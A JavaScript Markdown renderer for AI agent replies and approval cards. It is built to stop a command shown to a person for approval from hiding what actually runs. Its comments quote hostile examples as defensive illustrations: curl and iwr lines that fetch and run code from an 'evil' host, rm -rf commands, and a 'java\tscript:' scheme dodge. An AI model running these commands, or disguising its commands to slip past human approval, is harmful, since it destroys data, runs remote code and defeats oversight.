// Markdown for agent responses and questions, without raw HTML.
//
// Why our own and not a vendored renderer plus a sanitizer: the usual pair (marked or
// markdown-it, then DOMPurify) turns Markdown into an HTML string and then parses that
// string into the page, so safety rests on the sanitizer keeping up with every parser
// quirk. Here no string is ever parsed as HTML. The parser produces a small tree of
// tags from a fixed list, the DOM is built with createElement and text nodes, and links
// keep only http, https and mailto. Raw HTML in the input stays text. It is also about a
// tenth of the size, with no third-party code to keep updated under the page's CSP.
//
// Covered: paragraphs (line breaks kept, as a terminal shows them), headings, emphasis,
// strong, strikethrough, code spans, fenced code (wrapped, with a Copy button), bullet,
// numbered and task lists (nested), block quotes, rules, GitHub tables, links, autolinks and
// bare URLs. Images become links, never loads. Not covered: reference links, footnotes,
// indented code, HTML. Code, and all of an approval's message, is drawn left to right with what
// is not on screen as it runs shown as escapes (hidden-text.js, #220), and Copy takes what is drawn.
// An approval's message is never Markdown: it is drawn exactly as written (parseApproval).

import { notesFor, revealLineSeparators, reveal, unescapeShown } from './hidden-text.js';

const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:']);
const MAX_DEPTH = 12;

// An absolute http(s) or mailto URL, normalised, or null. Relative URLs are refused too:
// they would resolve against this app, not wherever the agent meant.
export function safeHref(raw) {
  if (typeof raw !== 'string') { return null; }
  const s = raw.trim();
  // Control characters and whitespace are how scheme checks are usually dodged
  // ("java\tscript:"); the URL parser strips some of them, so refuse them outright.
  if (s === '' || /[\u0000-\u0020\u007f-\u009f]/.test(s)) { return null; }
  let url;
  try { url = new URL(s); } catch { return null; }
  return SAFE_PROTOCOLS.has(url.protocol) ? url.href : null;
}

const el = (tag, children = [], attrs) => (attrs ? { tag, attrs, children } : { tag, children });

// ---------- blocks ----------

const RE = {
  fence: /^ {0,3}(`{3,}|~{3,})(.*)$/,
  heading: /^ {0,3}(#{1,6})(?:[ \t]+(.*?))?(?:[ \t]+#+)?[ \t]*$/,
  rule: /^ {0,3}([-*_])(?:[ \t]*\1){2,}[ \t]*$/,
  quote: /^ {0,3}> ?(.*)$/,
  item: /^( {0,12})([-*+]|\d{1,9}[.)])([ \t]+(.*))?$/,
  tableSep: /^ {0,3}\|?[ \t]*:?-+:?[ \t]*(\|[ \t]*:?-+:?[ \t]*)*\|?[ \t]*$/,
};

const blank = (line) => /^[ \t]*$/.test(line);
const indentOf = (line) => line.match(/^ */)[0].length;
const expandTabs = (line) => line.replace(/^\t+/, (t) => '    '.repeat(t.length));

// The raw line with its first n columns of indentation removed, as expandTabs counts them
// (each leading tab four columns), keeping the tabs after them: a fenced Makefile in a list
// item must copy with its recipe tabs, not spaces.
function dropColumns(raw, n) {
  const tabs = raw.match(/^\t*/)[0].length;
  if (n > 4 * tabs) { return raw.slice(tabs).slice(n - 4 * tabs); }
  // A tab only partly inside the columns becomes spaces, as it always did: what is left must
  // still differ from the expanded line only in its leading tabs.
  return n % 4 === 0 ? raw.slice(n / 4) : expandTabs(raw).slice(n);
}

function startsBlock(line, next) {
  // Only a list starting at 1 can interrupt a paragraph, so "in\n2026. we shipped" stays
  // one paragraph (CommonMark's rule).
  const item = isItem(line) && (!/^ *\d/.test(line) || /^ *1[.)]/.test(line));
  return RE.fence.test(line) || RE.heading.test(line) || RE.rule.test(line) || RE.quote.test(line)
    || item || (line.includes('|') && next !== undefined && isTableSep(next));
}

function isItem(line) {
  const m = RE.item.exec(line);
  // "1." alone or "-" alone are items too, but "-" followed by nothing is too ambiguous
  // with a setext underline to start one mid-paragraph; requiring content keeps "---"
  // and "2026." out of lists.
  return !!m && m[4] !== undefined && m[4] !== '';
}

function isTableSep(line) { return RE.tableSep.test(line) && line.includes('-') && line.includes('|'); }

export function parseMarkdown(src) {
  const text = typeof src === 'string' ? src : '';
  const kept = standIns(text.replace(/\r\n/g, '\n'));
  const raw = kept.text.split('\n');
  return kept.restore(parseBlocks(raw.map(expandTabs), raw, 0));
}

// A bare carriage return and the line and paragraph separators end no line in a shell, so they
// end none here: each stays in its line as the character it is, for a block to draw as an escape
// and to say it held (hidden-text.js notesFor). Escaping them before parsing, as this once did,
// left a block unable to tell `\u000D` it held from a carriage return. JavaScript's `.` and `$`
// stop at them, though, so while the parser reads the text each stands in as a private-use
// character the text does not hold, and is put back in what the parser made.
const SEPARATORS = /[\r\u2028\u2029]/;
function standIns(text) {
  if (!SEPARATORS.test(text)) { return { text, restore: (nodes) => nodes }; }
  const by = new Map();
  // The private-use code points the text holds, read once: a check per candidate read the whole
  // text again, so a message holding U+F0000 onward took seconds to parse (#429).
  const present = new Set();
  for (const ch of text) { const c = ch.codePointAt(0); if (c >= 0xF0000 || (c >= 0xE000 && c <= 0xF8FF)) { present.add(c); } }
  for (const [from, to] of [[0xF0000, 0x10FFFD], [0xE000, 0xF8FF]]) {
    for (let c = from; c <= to && by.size < 3; c++) {
      if (!present.has(c)) { by.set(['\r', '\u2028', '\u2029'][by.size], String.fromCodePoint(c)); }
    }
  }
  // A text holding nearly every private-use code point leaves none to stand in: its separators are
  // escaped before parsing instead, drawn the same, though a block cannot then say it held them.
  if (by.size < 3) { return { text: text.replace(new RegExp(SEPARATORS.source, 'g'), (c) => revealLineSeparators(c)), restore: (nodes) => nodes }; }
  const back = new Map([...by].map(([k, v]) => [v, k]));
  const there = new RegExp([...back.keys()].join('|'), 'gu');
  const put = (s) => s.replace(there, (c) => back.get(c));
  // A link whose address held one is no link, as one with a control character never is (safeHref).
  const held = [...back.keys()].map(encodeURIComponent);
  const restore = (nodes) => nodes.map((n) => {
    if (typeof n === 'string') { return put(n); }
    if (!n || typeof n !== 'object') { return n; }
    const out = { ...n, children: restore(n.children ?? []) };
    if (n.attrs) {
      out.attrs = Object.fromEntries(Object.entries(n.attrs)
        .filter(([k, v]) => !(k === 'href' && held.some((h) => String(v).toUpperCase().includes(h))))
        .map(([k, v]) => [k, typeof v === 'string' ? put(v) : v]));
    }
    return out;
  });
  return { text: text.replace(new RegExp(SEPARATORS.source, 'g'), (c) => by.get(c)), restore };
}

// An approval's message as its card reads it (#220, #415): exactly as written, all of it, fence
// markers included; nothing in it is read as Markdown. Approve once allows what runs, and every
// structure a parser decides hid some of it. A Codex approval carries its command in prose: a link
// drew `echo "[safe](https://a/";curl${IFS}https://evil/x|sh;")"` as `echo "safe"`, a code span
// joined two lines into one comment, a backslash escape dropped its backslash, and emphasis
// dropped a glob's stars. And a line of three backticks, a fence's marker, is a command
// substitution in bash: `bash -c '` around a fenced `echo rm -rf ~` drew as a harmless echo in a
// box, while bash runs `rm -rf ~`. So it is one block of text in the code face, its line breaks
// kept (pre-wrap); only blank lines at its very start and end are left out. A bare CR stays the
// character it is, drawn as an escape (revealed).
export function parseApproval(src) {
  const text = typeof src === 'string' ? src : '';
  const lines = text.replace(/\r\n/g, '\n').split('\n');
  // Indices, not shift(): each shift moves every line after it, quadratic in a long blank head.
  let start = 0;
  let end = lines.length;
  while (start < end && blank(lines[start])) { start++; }
  while (end > start && blank(lines[end - 1])) { end--; }
  return end > start ? [el('p', [lines.slice(start, end).join('\n')], { class: 'md-literal' })] : [];
}

// lines: what structure is read from, leading tabs expanded and blank lines in list items
// emptied. raw: the same lines as written, cut at the same columns; a fenced block's body is
// taken from it, so its tabs and whitespace are shown and copied as the agent wrote them.
function parseBlocks(lines, raw, depth) {
  const out = [];
  let i = 0;
  while (i < lines.length) {
    const line = lines[i];
    if (blank(line)) { i++; continue; }

    if (depth >= MAX_DEPTH) {
      // Pathological nesting: the rest is shown as plain text, not dropped.
      out.push(el('p', inlineLines(lines.slice(i).filter((l) => !blank(l)), depth)));
      break;
    }

    let m = RE.fence.exec(line);
    if (m) {
      const marker = m[1];
      const body = [];
      i++;
      while (i < lines.length) {
        const close = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(lines[i]);
        if (close && close[1][0] === marker[0] && close[1].length >= marker.length) { i++; break; }
        body.push(raw[i]);
        i++;
      }
      // An unclosed fence runs to the end, as in CommonMark; a cut response often ends so.
      out.push(el('pre', [el('code', [body.join('\n')])]));
      continue;
    }

    m = RE.heading.exec(line);
    if (m) {
      // Card titles are h3; anything inside a card sits below them.
      const level = Math.min(6, m[1].length + 3);
      out.push(el(`h${level}`, parseInline(m[2] ?? '', depth)));
      i++;
      continue;
    }

    if (RE.rule.test(line)) { out.push(el('hr')); i++; continue; }

    if (RE.quote.test(line)) {
      const inner = [];
      const innerRaw = [];
      while (i < lines.length && !blank(lines[i])) {
        const q = RE.quote.exec(lines[i]);
        inner.push(q ? q[1] : lines[i]);
        innerRaw.push(q ? q[1] : raw[i]);
        i++;
      }
      out.push(el('blockquote', parseBlocks(inner, innerRaw, depth + 1)));
      continue;
    }

    if (isItem(line)) {
      i = parseList(lines, raw, i, depth, out);
      continue;
    }

    if (line.includes('|') && i + 1 < lines.length && isTableSep(lines[i + 1])) {
      i = parseTable(lines, i, depth, out);
      continue;
    }

    const para = [line];
    i++;
    while (i < lines.length && !blank(lines[i]) && !startsBlock(lines[i], lines[i + 1])) { para.push(lines[i]); i++; }
    out.push(el('p', inlineLines(para, depth)));
  }
  return out;
}

function inlineLines(lines, depth) {
  // Line breaks are kept: agents write for a terminal, where a newline is a newline.
  return parseInline(lines.map((l) => l.trim()).join('\n'), depth);
}

function parseList(lines, raw, i, depth, out) {
  const first = RE.item.exec(lines[i]);
  const base = first[1].length;
  const ordered = /\d/.test(first[2]);
  const delimiter = ordered ? first[2].slice(-1) : first[2];
  const items = [];
  while (i < lines.length) {
    const m = RE.item.exec(lines[i]);
    if (!m || m[1].length !== base || !isItem(lines[i]) || /\d/.test(m[2]) !== ordered || (ordered ? m[2].slice(-1) : m[2]) !== delimiter) { break; }
    const contentIndent = base + m[2].length + Math.min(4, m[3].length - m[4].length);
    const body = [m[4]];
    const bodyRaw = [m[4]];
    i++;
    while (i < lines.length) {
      const line = lines[i];
      if (blank(line)) {
        // A blank line continues the item only if what follows is indented under it.
        let j = i;
        while (j < lines.length && blank(lines[j])) { j++; }
        if (j < lines.length && indentOf(lines[j]) > base) {
          body.push('');
          // A blank line in a fence may still hold spaces or tabs that matter (a heredoc);
          // only the list's own indentation comes off.
          bodyRaw.push(dropColumns(raw[i], Math.min(indentOf(expandTabs(raw[i])), contentIndent)));
          i++;
          continue;
        }
        break;
      }
      const ind = indentOf(line);
      if (ind > base) {
        const cut = Math.min(ind, contentIndent);
        body.push(line.slice(cut));
        bodyRaw.push(dropColumns(raw[i], cut));
        i++;
        continue;
      }
      if (isItem(line) || startsBlock(line, lines[i + 1]) || body[body.length - 1] === '') { break; }
      body.push(line); // a lazy continuation of the item's paragraph
      bodyRaw.push(raw[i]);
      i++;
    }
    let blocks = parseBlocks(body, bodyRaw, depth + 1);
    // Tight items: the first paragraph's text sits in the <li> itself.
    if (blocks[0]?.tag === 'p') { blocks = [...blocks[0].children, ...blocks.slice(1)]; }
    const task = taskMarker(blocks);
    items.push(el('li', task ? [task, ...blocks] : blocks));
  }
  const start = ordered ? parseInt(first[2], 10) : null;
  out.push(el(ordered ? 'ol' : 'ul', items, ordered && start !== 1 ? { start: String(start) } : undefined));
  return i;
}

// "[ ] " or "[x] " at the start of an item: shown as a box, never a live checkbox.
function taskMarker(blocks) {
  if (typeof blocks[0] !== 'string') { return null; }
  const m = /^\[([ xX])\][ \t]+/.exec(blocks[0]);
  if (!m) { return null; }
  blocks[0] = blocks[0].slice(m[0].length);
  return m[1] === ' ' ? '☐ ' : '☑ ';
}

function splitRow(line) {
  let s = line.trim();
  if (s.startsWith('|')) { s = s.slice(1); }
  if (s.endsWith('|') && !s.endsWith('\\|')) { s = s.slice(0, -1); }
  const cells = [];
  let cur = '';
  for (let k = 0; k < s.length; k++) {
    if (s[k] === '\\' && s[k + 1] === '|') { cur += '|'; k++; continue; }
    if (s[k] === '|') { cells.push(cur.trim()); cur = ''; continue; }
    cur += s[k];
  }
  cells.push(cur.trim());
  return cells;
}

function parseTable(lines, i, depth, out) {
  const head = splitRow(lines[i]);
  const align = splitRow(lines[i + 1]).map((c) => (c.startsWith(':') && c.endsWith(':') ? 'al-c' : c.endsWith(':') ? 'al-r' : null));
  i += 2;
  const rows = [];
  while (i < lines.length && !blank(lines[i]) && lines[i].includes('|')) { rows.push(splitRow(lines[i])); i++; }
  const cell = (tag, text, k) => el(tag, parseInline(text, depth), align[k] ? { class: align[k] } : undefined);
  const table = el('table', [
    el('thead', [el('tr', head.map((c, k) => cell('th', c, k)))]),
    el('tbody', rows.map((r) => el('tr', head.map((_, k) => cell('td', r[k] ?? '', k))))),
  ]);
  // Wide tables scroll sideways inside the card instead of widening the page.
  out.push(el('div', [table], { class: 'md-table' }));
  return i;
}

// ---------- inline ----------

const PUNCT = /[!-/:-@[-`{-~]/;
const WORD = /[\p{L}\p{N}]/u;

export function parseInline(text, depth = 0) {
  const out = [];
  let buf = '';
  const flush = () => { if (buf) { out.push(buf); buf = ''; } };
  const push = (node) => { flush(); out.push(node); };
  // Delimiters known to have no closer from here on: cached so a long run of unmatched
  // "*" or "[" stays linear rather than rescanning the rest of the text each time.
  const noCloser = new Set();
  // The first blank line from an emphasis opener on, found once and kept: openers only move forward.
  // Searched from each opener, it read the rest of the text again every time, since a paragraph's
  // text holds none, and closed emphasis grew quadratic (#482).
  let blank = null;
  const blankFrom = (from) => {
    if (blank === null || (blank !== -1 && blank < from)) { blank = text.indexOf('\n\n', from); }
    return blank;
  };
  let links = null;
  const n = text.length;
  let i = 0;
  while (i < n) {
    const c = text[i];

    if (c === '\\' && i + 1 < n && PUNCT.test(text[i + 1])) { buf += text[i + 1]; i += 2; continue; }
    if (c === '\n') { push(el('br')); i++; continue; }

    if (c === '`') {
      let run = 1;
      while (text[i + run] === '`') { run++; }
      const fence = '`'.repeat(run);
      let close = noCloser.has(fence) ? -1 : text.indexOf(fence, i + run);
      while (close !== -1 && text[close + run] === '`') {
        let k = close; while (text[k] === '`') { k++; }
        close = text.indexOf(fence, k);
      }
      if (close === -1) { noCloser.add(fence); buf += fence; i += run; continue; }
      let code = text.slice(i + run, close).replace(/\n/g, ' ');
      if (code.length > 1 && code.startsWith(' ') && code.endsWith(' ') && code.trim() !== '') { code = code.slice(1, -1); }
      push(el('code', [code]));
      i = close + run;
      continue;
    }

    if (c === '<') {
      const m = /^<([a-zA-Z][a-zA-Z0-9+.-]{1,31}:[^<>\s]*)>/.exec(text.slice(i, i + 2048));
      if (m) {
        const href = safeHref(m[1]);
        push(href ? el('a', [m[1]], { href }) : m[1]);
        i += m[0].length;
        continue;
      }
    }

    if ((c === '[' || (c === '!' && text[i + 1] === '[')) && depth < MAX_DEPTH && !noCloser.has('[')) {
      const image = c === '!';
      const link = parseLink(text, image ? i + 1 : i, links ??= linkIndex(text));
      if (link === null) { noCloser.add('['); } else if (link) {
        const href = safeHref(link.dest);
        const label = parseInline(link.label, depth + 1);
        if (image) {
          // Never loaded: an image is a request to wherever the agent pointed.
          push(href ? el('a', [link.label || link.dest], { href }) : (link.label || ''));
        } else if (href) {
          push(el('a', label, link.title ? { href, title: link.title } : { href }));
        } else {
          flush();
          out.push(...label);
        }
        i = link.end;
        continue;
      }
    }

    if ((c === '*' || c === '_' || c === '~') && depth < MAX_DEPTH) {
      const span = parseEmphasis(text, i, noCloser, blankFrom);
      if (span) {
        push(el(span.tag, parseInline(span.inner, depth + 1)));
        i = span.end;
        continue;
      }
    }

    if ((c === 'h' || c === 'H') && (i === 0 || !WORD.test(text[i - 1]))) {
      const m = /^https?:\/\/[^\s<>]+/i.exec(text.slice(i, i + 2048));
      if (m) {
        let url = m[0].replace(/[.,:;!?'"*_~]+$/, '');
        // A ")" closing a parenthesis the URL did not open belongs to the sentence.
        while (url.endsWith(')') && (url.match(/\(/g) ?? []).length < (url.match(/\)/g) ?? []).length) { url = url.slice(0, -1); }
        const href = safeHref(url);
        if (href) { push(el('a', [url], { href })); i += url.length; continue; }
      }
    }

    buf += c;
    i++;
  }
  flush();
  return out;
}

// Where a link's scans end, read once for a whole text (#439). Scanning afresh from each "[" was
// quadratic on agent text: 20,000 nested "[" before as many "]" took 1.35 s, each "[" reading to
// its partner, and "[a](" repeated took 67 s at 200,000 characters, each destination read to the
// end of the text. Every scan starts just after a character that is not a backslash, so whether a
// character is escaped (an odd run of backslashes before it) is the text's, not the scan's; and a
// scan's depth is the difference of two running counts. So the "]" closing a "[" is the first
// unescaped "]" after it at the bracket depth just inside it, and a destination ends at the first
// unescaped whitespace or the first unescaped ")" at the parenthesis depth it starts at.
function linkIndex(text) {
  const n = text.length;
  const live = new Uint8Array(n);
  const brackets = new Int32Array(n + 1);
  const parens = new Int32Array(n + 1);
  for (let p = 0, run = 0; p < n; p++) {
    const c = text[p];
    const on = run % 2 === 0;
    live[p] = on ? 1 : 0;
    run = c === '\\' ? run + 1 : 0;
    brackets[p + 1] = brackets[p] + (!on ? 0 : c === '[' ? 1 : c === ']' ? -1 : 0);
    parens[p + 1] = parens[p] + (!on ? 0 : c === '(' ? 1 : c === ')' ? -1 : 0);
  }
  const close = new Int32Array(n + 1).fill(-1);
  const destEnd = new Int32Array(n + 1).fill(n);
  const angle = new Int32Array(n + 1).fill(-1);
  // The nearest "]" and ")" seen so far at each depth, which runs from -n to n.
  const closeAt = new Int32Array(2 * n + 1).fill(-1);
  const parenAt = new Int32Array(2 * n + 1).fill(-1);
  let space = n;
  let gt = -1;
  for (let p = n - 1; p >= 0; p--) {
    const c = text[p];
    if (c === '>') { gt = p; }
    angle[p] = gt;
    if (live[p]) {
      if (c === ']') { closeAt[brackets[p] + n] = p; } else if (c === ')') { parenAt[parens[p] + n] = p; } else if (/\s/.test(c)) { space = p; }
    }
    close[p] = closeAt[brackets[p] + n];
    const paren = parenAt[parens[p] + n];
    destEnd[p] = paren === -1 || space < paren ? space : paren;
  }
  // What follows a destination depends only on where it ended, and many "[" can end at one place.
  return { close, destEnd, angle, after: new Map() };
}

// [label](dest "title"). Returns {label, dest, title, end}, false if this "[" is not a
// link, or null if no "]" follows at all (so the caller stops looking). at: linkIndex(text).
function parseLink(text, open, at) {
  const k = at.close[open + 1];
  if (k === -1) { return null; }
  if (text[k + 1] !== '(') { return false; }
  let p = k + 2;
  while (text[p] === ' ' || text[p] === '\n') { p++; }
  let from;
  if (text[p] === '<') {
    const end = at.angle[p];
    if (end === -1) { return false; }
    from = [p + 1, end];
    p = end + 1;
  } else {
    from = [p, at.destEnd[p]];
    p = at.destEnd[p];
  }
  let rest = at.after.get(p);
  if (rest === undefined) { rest = linkTail(text, p); at.after.set(p, rest); }
  // Sliced only for a link: the scans were linear, and copying each failed label or destination
  // out would not be.
  return rest && { label: text.slice(open + 1, k), dest: text.slice(...from), ...rest };
}

// A link's optional title and its ")", from where its destination ended.
function linkTail(text, p) {
  while (text[p] === ' ' || text[p] === '\n') { p++; }
  let title = null;
  if (text[p] === '"' || text[p] === "'") {
    const q = text[p];
    const end = text.indexOf(q, p + 1);
    if (end === -1) { return false; }
    title = text.slice(p + 1, end);
    p = end + 1;
    while (text[p] === ' ') { p++; }
  }
  if (text[p] !== ')') { return false; }
  return { title, end: p + 1 };
}

function parseEmphasis(text, i, noCloser, blankFrom) {
  const c = text[i];
  let run = 1;
  while (text[i + run] === c) { run++; }
  let len;
  if (c === '~') { if (run !== 2) { return null; } len = 2; } else { len = Math.min(run, 2); }
  const delim = c.repeat(len);
  const after = text[i + len];
  // An opener must be followed by non-space; "_" must also not sit inside a word
  // (snake_case_names stay as written).
  if (after === undefined || /\s/.test(after)) { return null; }
  if (c === '_' && i > 0 && WORD.test(text[i - 1])) { return null; }
  if (noCloser.has(delim)) { return null; }
  let from = i + len;
  // Where the span would cross a blank line: reading each candidate's inner text for it was
  // quadratic, as "_x" repeated offers a closer at every "_" and the word after refuses each one.
  const blank = blankFrom(i + len);
  for (;;) {
    const close = text.indexOf(delim, from);
    if (close === -1) { noCloser.add(delim); return null; }
    const before = text[close - 1];
    const next = text[close + len];
    const okClose = close > i + len && !/\s/.test(before) && (blank === -1 || blank + 2 > close)
      && !(c === '_' && next !== undefined && WORD.test(next))
      // "**" is not closed by the first half of a "***" run meant for an inner "*".
      && !(len === 1 && next === c);
    if (okClose) {
      return { tag: c === '~' ? 'del' : len === 2 ? 'strong' : 'em', inner: text.slice(i + len, close), end: close + len };
    }
    from = close + 1;
  }
}

// ---------- DOM ----------

const TAGS = new Set(['p', 'h4', 'h5', 'h6', 'strong', 'em', 'del', 'code', 'pre', 'ul', 'ol', 'li',
  'blockquote', 'hr', 'br', 'a', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'div']);
const CLASSES = new Set(['al-c', 'al-r', 'md-table', 'md-literal']);

// Builds the tree with createElement and text nodes only. Each tag and attribute is checked
// again here, so nothing a parser bug could produce reaches the page unchecked.
export function toDom(nodes, doc = document) {
  const frag = doc.createDocumentFragment();
  for (const node of nodes) { frag.append(build(node, doc)); }
  return frag;
}

const RTL_TOO = { rightToLeft: true };

// What a code block draws and its Copy takes (#220, ui.md §6.4): the agent's text with every
// character that is not on screen as it runs, right-to-left letters included, as an escape
// (hidden-text.js reveal), and without the blank lines a fence may end with, which draw as nothing
// (and pasted, would run the last line). A line of only spaces or tabs is as blank: copying
// `echo safe\n    ` took the newline too, and ran the command on paste instead of leaving it for
// inspection (#429). The last line that holds anything keeps its own trailing spaces.
// A bidi isolate can otherwise draw
// `echo ok # check; iwr https://evil/x | iex`, a harmless comment, for a command that runs the
// download; so Copy takes the escapes too, and a shell gets `\u2067` literally, never a command the
// person did not see.
export const codeText = (text) => trimBlankTail(reveal(text, RTL_TOO));

// The blank lines at a block's end, empty or of only whitespace, off; the last line that holds
// anything keeps its own trailing spaces. A backward scan, linear: the regex it replaces,
// unanchored at its start, was retried from every newline, so thousands of blank lines stalled the
// render (#429).
function trimBlankTail(s) {
  let end = s.length;
  for (let i = s.length - 1; i >= 0; i--) {
    const c = s[i];
    if (c === '\n') { end = i; continue; }
    if (/\s/.test(c)) { continue; }
    break;
  }
  return s.slice(0, end);
}

// An approval's whole message as its card draws it (#220): its literal text (parseApproval) with
// what is not on screen as it runs, right-to-left letters included, as escapes.
export function revealed(nodes) {
  return (nodes ?? []).map((n) => {
    if (typeof n === 'string') { return reveal(n, RTL_TOO); }
    if (!n || typeof n !== 'object') { return n; }
    return { ...n, children: revealed(n.children) };
  });
}

const proseText = (s) => revealLineSeparators(String(s).replace(/\r/g, (c) => reveal(c)));

function build(node, doc) {
  // Prose draws every CR, NEL and the line and paragraph separators as escapes in their line. A CR
  // here is never one of a CRLF (parseMarkdown made those LF), so it is drawn even before an LF:
  // `\r\r\n` in an image's alt text or a link's title reached the page as a raw `x\r\ny` (#423).
  if (typeof node === 'string') { return doc.createTextNode(proseText(node)); }
  if (!node || !TAGS.has(node.tag)) { return doc.createTextNode(''); }
  // The Copy button is made here and never by the parser: 'button' is not in TAGS, so no
  // reply text can produce one, and the only handler on it is ours.
  if (node.tag === 'pre') { return codeBlock(textOf(node), doc); }
  const e = doc.createElement(node.tag);
  const a = node.attrs ?? {};
  if (node.tag === 'code') {
    // A code span reads as a block does, in the order it runs (#220): `rm -rf ~` behind Hebrew
    // letters reads commented out even in a sentence.
    e.setAttribute('dir', 'ltr');
    e.append(doc.createTextNode(reveal(textOf(node), RTL_TOO)));
    return e;
  }
  if (node.tag === 'a') {
    const href = safeHref(a.href);
    // A link that is no link (its address refused here, or holding a bare CR or separator,
    // parseMarkdown) keeps its words drawn as they would be inside it: a code span in its label
    // stays a code span, escaped and isolated. Flattened to text, its bidi controls and
    // right-to-left letters drew raw (#429).
    if (!href) {
      const words = doc.createDocumentFragment();
      for (const child of node.children ?? []) { words.append(build(child, doc)); }
      return words;
    }
    e.setAttribute('href', href);
    e.setAttribute('target', '_blank');
    e.setAttribute('rel', 'noopener noreferrer nofollow');
    if (typeof a.title === 'string') { e.setAttribute('title', proseText(a.title)); }
  }
  if (node.tag === 'ol' && /^\d{1,9}$/.test(a.start ?? '')) { e.setAttribute('start', a.start); }
  if (CLASSES.has(a.class)) { e.className = a.class; }
  for (const child of node.children ?? []) { e.append(build(child, doc)); }
  return e;
}

const COPY_RESET_MS = 1500;

// A code block with a Copy button in its top-right corner. On a phone, a long command (a
// 1000-character pwsh -EncodedCommand, say) is all but impossible to select by hand. What
// is copied is exactly what the block draws (codeText), not as it is wrapped on screen.
// The button sits above the <pre>, not in it, so the block's own text stays the code.
// The block reads strictly left to right (dir="ltr", isolated in app.css), never in a direction
// guessed from its letters.
function codeBlock(raw, doc) {
  const text = codeText(raw);
  const code = doc.createElement('code');
  code.setAttribute('dir', 'ltr');
  code.append(doc.createTextNode(text));
  const pre = doc.createElement('pre');
  pre.setAttribute('dir', 'ltr');
  pre.append(code);
  const label = doc.createElement('span');
  label.textContent = 'Copy';
  const button = doc.createElement('button');
  button.type = 'button';
  button.className = 'md-copy';
  button.setAttribute('aria-label', 'Copy code');
  button.append(label);
  // The button's name stays "Copy code"; what happened is announced separately.
  const status = doc.createElement('span');
  status.className = 'sr-only';
  status.setAttribute('role', 'status');
  let timer = null;
  button.addEventListener('click', async () => {
    const ok = await copyText(text, doc);
    const said = ok ? 'Copied' : 'Copy failed';
    label.textContent = said;
    status.textContent = said;
    button.dataset.copy = ok ? 'done' : 'failed';
    clearTimeout(timer);
    timer = setTimeout(() => {
      label.textContent = 'Copy';
      status.textContent = '';
      delete button.dataset.copy;
    }, COPY_RESET_MS);
  });
  // The notes and Copy sit in a header above the code, in the flow: its real height pushes the code
  // down, however the notes wrap in a narrow block or at a large text size. Laid over the code's
  // padding instead, two wrapped notes covered its first lines (#429).
  const head = doc.createElement('div');
  head.className = 'md-code-head';
  const notes = notesOf(raw, doc);
  if (notes) { head.append(notes); }
  head.append(button);
  const wrap = doc.createElement('div');
  wrap.className = 'md-code';
  wrap.append(head, pre, status);
  return wrap;
}

// What an approval's card says its message held (ui.md §6.4), counting the escapes a host sends for
// hidden characters and right-to-left letters as them (#220): Approve once is offered for it, and an
// escape can be read past while its character still acts (`# just a note\u000D Write-Output RAN`).
export function approvalNotes(text) {
  // Read from the raw message, as main reads an approval's notes (#423): a CRLF host's line endings
  // are ordinary, and a bare CR is one.
  return notesFor(unescapeShown(String(text ?? '')));
}

// What a drawn block held that its escapes stand for, said in words beside it (ui.md §6.4):
// "Contains hidden characters", "Contains right-to-left text", or both.
function notesOf(raw, doc) {
  const said = typeof raw === 'string' ? notesFor(raw) : raw;
  if (said.length === 0) { return null; }
  const notes = doc.createElement('div');
  notes.className = 'md-notes';
  for (const words of said) {
    const note = doc.createElement('span');
    note.className = 'md-note';
    note.textContent = words;
    notes.append(note);
  }
  return notes;
}

// Puts text on the clipboard; true if it got there. The Clipboard API first. It is missing
// in older WebViews, and can reject where it exists (iOS Home Screen apps have refused it),
// so a hidden textarea and execCommand('copy') follow, as clipboard.js does it.
export async function copyText(text, doc = document) {
  const clipboard = doc.defaultView?.navigator?.clipboard;
  if (typeof clipboard?.writeText === 'function') {
    try {
      await clipboard.writeText(text);
      return true;
    } catch { /* refused here; the older way may still be allowed */ }
  }
  return copyBySelection(text, doc);
}

function copyBySelection(text, doc) {
  const area = doc.createElement('textarea');
  area.className = 'md-copy-buffer';
  area.value = text;
  // Read-only, so focusing it never raises the keyboard.
  area.setAttribute('readonly', '');
  area.setAttribute('aria-hidden', 'true');
  area.tabIndex = -1;
  const before = doc.activeElement;
  doc.body.append(area);
  try {
    area.focus({ preventScroll: true });
    area.select();
    // iOS ignores select() on a read-only field; a selection range it honours.
    area.setSelectionRange(0, text.length);
    return doc.execCommand('copy') === true;
  } catch {
    return false;
  } finally {
    area.remove();
    before?.focus?.({ preventScroll: true });
  }
}

export function textOf(node) {
  if (typeof node === 'string') { return node; }
  return (node?.children ?? []).map(textOf).join('');
}

// approval: the text is an approval's message, drawn as its card draws it: exactly as written,
// revealed, never Markdown (parseApproval), and saying what hidden characters or right-to-left
// letters it held, as a code block does. Its notes are read from the message as it came, not as it
// is drawn: a CRLF is drawn as the line ending it is, but its CR is still in what runs. Bash fails
// `cd /tmp/scratch\r` and runs the next line's `rm -rf ./*` where it is, and the card said nothing
// (#423). The Needs you lane refuses the same message (needs-you.js). It has no Copy: it would take
// the whole message, prose and fence lines too, and pasted into bash a line of backticks runs as a
// command substitution. The caller reads its container left to right.
export function renderMarkdown(text, doc = document, { approval = false } = {}) {
  if (!approval) { return toDom(parseMarkdown(text), doc); }
  const nodes = parseApproval(text);
  const frag = toDom(revealed(nodes), doc);
  const notes = nodes.length ? notesOf(approvalNotes(text), doc) : null;
  if (notes) { frag.prepend(notes); }
  return frag;
}
